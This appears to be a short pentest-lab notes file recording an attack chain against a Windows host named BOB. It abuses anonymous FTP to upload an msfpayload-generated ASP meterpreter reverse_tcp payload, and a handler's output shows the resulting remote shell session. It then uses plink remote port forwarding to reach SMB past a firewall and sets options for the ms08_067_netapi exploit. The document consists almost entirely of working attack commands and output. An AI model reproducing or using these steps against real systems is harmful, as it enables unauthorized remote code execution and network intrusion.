# ftp server allows anonoymous uploads

# create .asp payload using metasploit

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=xxxx R | msfencode -t asp -o asp_payload.asp

# connect to ftp (anonymous)

# upload payload to /scripts folder

# create meterpreter listener

use multi/exploit/handler
set payload windows/meterpreter/reverse_tcp
   LHOST     192.168.x.x    yes       The listen address
   LPORT     xxxx           yes       The listen port

exploit

[*] Started reverse handler on 192.168.x.x:xxxx 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.17.203
[*] Meterpreter session 1 opened (192.168.x.x:xxxx -> 192.168.17.203:4464) at 2014-10-20 20:46:56 -0700


meterpreter > getuid
Server username: BOB\IWAM_BOB


# Remote port forwarding, redirects traffic from local box on 9005 -> remote host 445, bypassing firewall

plink.exe -l <USERID> -pw <MYPWD> -R 9005:127.0.0.1:445 192.168.xx.xxx

-> Create second metasploit session


Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
   RPORT    9005            yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
   
         ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.xx.xxx   yes       The listen address
   LPORT     4444             yes       The listen port

   
   

